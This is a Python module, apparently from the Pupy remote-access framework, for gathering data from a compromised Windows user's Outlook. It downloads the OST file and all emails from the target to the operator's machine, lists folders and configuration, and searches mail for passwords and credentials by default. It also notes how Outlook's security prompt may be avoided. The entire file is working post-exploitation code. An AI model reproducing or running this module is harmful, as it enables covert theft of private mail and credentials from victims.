# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

import os

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from rpyc.utils.classic import download

__class_name__="Outlook"

@config(compat="windows", category="gather")
class Outlook(PupyModule):
    """ interact with Outlook session of the targeted user """
    dependencies=['outlook', 'win32api','win32com','pythoncom','winerror']

    OL_SAVE_AS_TYPE={'olTXT': 0,'olRTF':1,'olTemplate': 2,'olMSG': 3,'olDoc':4,'olHTML':5,'olVCard': 6,'olVCal':7,'olICal': 8}
    OL_DEFAULT_FOLDERS = {'olFolderDeletedItems':3,'olFolderDrafts':16,'olFolderInbox':6,'olFolderJunk':23,'olFolderSentMail':5}

    @classmethod
    def init_argparse(cls):
        '''
        '''
        cls.arg_parser = PupyArgumentParser(prog="outlook", description=cls.__doc__)
        cls.arg_parser.add_argument('-i', dest='information', action='store_true', help="Get Outlook configuration")
        cls.arg_parser.add_argument('-l', dest='foldersAndSubFolders', action='store_true', help="Get Outlook folders and subfolders")
        cls.arg_parser.add_argument('-n', dest='numberOfEmails', action='store_true', help="Get number of emails stored in the outlook folder choisen (see options below)")
        cls.arg_parser.add_argument('-d', dest='downloadAllEmails', action='store_true', help="Download all emails stored in the outlook folder choisen with MAPI (see options below)")
        cls.arg_parser.add_argument('-t', dest='downloadOST', action='store_true', help="Download Outlook OST file (Offline or cached Outlook items)")
        cls.arg_parser.add_argument('-s', dest='search', action='store_true', help="Search strings in emails, see -strings for options")
        cls.arg_parser.add_argument('-strings', dest='strings', default="password,pwd,credentials", help="Strings to search in emails (use with -s) (default: %(default)s)")
        cls.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will contain emails locally (default: %(default)s)")
        cls.arg_parser.add_argument('-folder-default', choices=list(cls.OL_DEFAULT_FOLDERS), default="olFolderInbox", dest='outlookFolder', help="Choose Outlook Folder using a default folder (default: %(default)s)")
        cls.arg_parser.add_argument('-folder-id', dest='folderId', default=None, help="Choose Outlook Folder using a folder ID (default: %(default)s)")
        cls.arg_parser.add_argument('-otype', choices=list(cls.OL_SAVE_AS_TYPE), default="olMSG", dest='msgSaveType', help="Email saved as this type (default: %(default)s)")

    def run(self, args):
        '''
        '''
        localFolder=args.localOutputFolder
        self.localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.client.desc['hostname'], self.client.desc['user'], self.client.desc['macaddr'].replace(':','')))
        if not os.path.exists(self.localFolder):
            self.info("Creating the {0} folder locally".format(self.localFolder))
            os.makedirs(self.localFolder)
        if args.folderId is not None:
            self.warning('Notice the folder Id option will be used and the default folder option will be disabled')
        outlook = self.client.conn.modules['outlook'].outlook(folderIndex=self.OL_DEFAULT_FOLDERS[args.outlookFolder], folderId=args.folderId, msgSaveType=args.msgSaveType)
        if args.downloadOST:
            self.success("Trying to download Outlook OST file of the targeted current user")
            paths = outlook.getPathToOSTFiles()
            if len(paths)>0:
                localPath = os.path.join(self.localFolder, ''.join(l for l in paths[0][0].encode('ascii','ignore') if l.isalnum()))
                self.success("Downloading the file {0} to {1}...".format(paths[0][1], localPath))
                download(self.client.conn, paths[0][1], localPath)
                self.success("OST file downloaded from {0} to {1}".format(paths[0][1], localPath))
            else:
                self.error("OST file not found or an error occured")
        if outlook.outlookIsInstalled():
            self.success("Outlook application seems to be installed on the target, trying to connect to MAPI...")
            if outlook.connect():
                self.success("Connected to outlook application trough MAPI")
            else:
                self.error("Impossible to connect to outlook application trough MAPI. Abording!")
                return
        else:
            self.error("Outlook application doesn't seem to be installed on the target. Nothing to do. Cancelling!")
            return
        if args.information:
            info = outlook.getInformation()
            for key, value in info.iteritems():
                self.success("{0}: {1}".format(key, value))
        if args.foldersAndSubFolders:
            self.success("Outlook folders and subfolders:")
            foldersAndSubFolders = outlook.getAllFolders()
            for i,folder in enumerate(foldersAndSubFolders):
                print "{0}: {1}".format(i, folder.encode('utf-8'))
                for j,subFolder in enumerate(foldersAndSubFolders[folder]):
                    print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
        if args.numberOfEmails:
            self.success("Trying to get number of emails in the {0} folder".format(args.outlookFolder))
            nb = outlook.getNbOfEmails()
            self.success("Number of emails in the {0} folder: {1}".format(args.outlookFolder, nb))
        if args.downloadAllEmails:
            self.success("Trying to download all emails stored in the {0} folder".format(args.outlookFolder))
            nb = outlook.getNbOfEmails()
            if nb == 0:
                self.error("This box is empty. You should choose another outlook folder")
            else:
                self.success("{0} emails found in {0}, Starting download...".format(args.outlookFolder))
                self.success("You can use msgconvert for reading these emails locally")
                self.warning("If nothing happens, a Outlook security prompt has probably been triggered on the target.")
                self.warning("Notice if an antivirus is installed on the target, you should be abled to download emails without security prompt (see https://support.office.com/en-us/article/I-get-warnings-about-a-program-accessing-e-mail-address-information-or-sending-e-mail-on-my-behalf-df007135-c632-4ae4-8577-dd4ba26750a2)")
                self.info("Downloading all emails")
                for i, anEmail in enumerate(outlook.getEmails()):
                    aPathToMailFile, filename = outlook.getAMailFile(anEmail)
                    self.success('Downloading email {0}/{1}...'.format(i+1, outlook.getNbOfEmails()))
                    localPathToFile = os.path.join(self.localFolder, filename)
                    self.info("Downloading the file {0} to {1}".format(aPathToMailFile, localPathToFile))
                    download(self.client.conn, aPathToMailFile, localPathToFile)
                    self.info("Deleting {0}".format(aPathToMailFile))
                    outlook.deleteTempMailFile(aPathToMailFile)
                print "\n"
                self.success("Download completed!")
        if args.search:
            self.success("Searching '{0}' in emails stored in {1} folder...".format(args.strings, args.outlookFolder))
            localPathToFile = os.path.join(self.localFolder, "research.txt")
            emails = outlook.searchStringsInEmails(strings=args.strings, separator=',')
            if len(emails) > 0:
                self.success("{0} emails found with {1}".format(len(emails), args.strings))
            else:
                self.error("{0} emails found with {1}".format(len(emails), args.strings))
            f = open(localPathToFile,"w")
            for i, anEmail in enumerate(emails):
                f.write("-"*100+'\n')
                f.write("[+] Email {0}\n".format(i))
                f.write("-"*100+'\n')
                f.write("Subject: {0}\n".format(anEmail['subject'].encode('utf8')))
                f.write("Body: {0}\n".format(anEmail['body'].encode('utf8')))
            self.success("Research completed!")
            self.success("See the following file for results: {0}".format(localPathToFile))
            f.close()
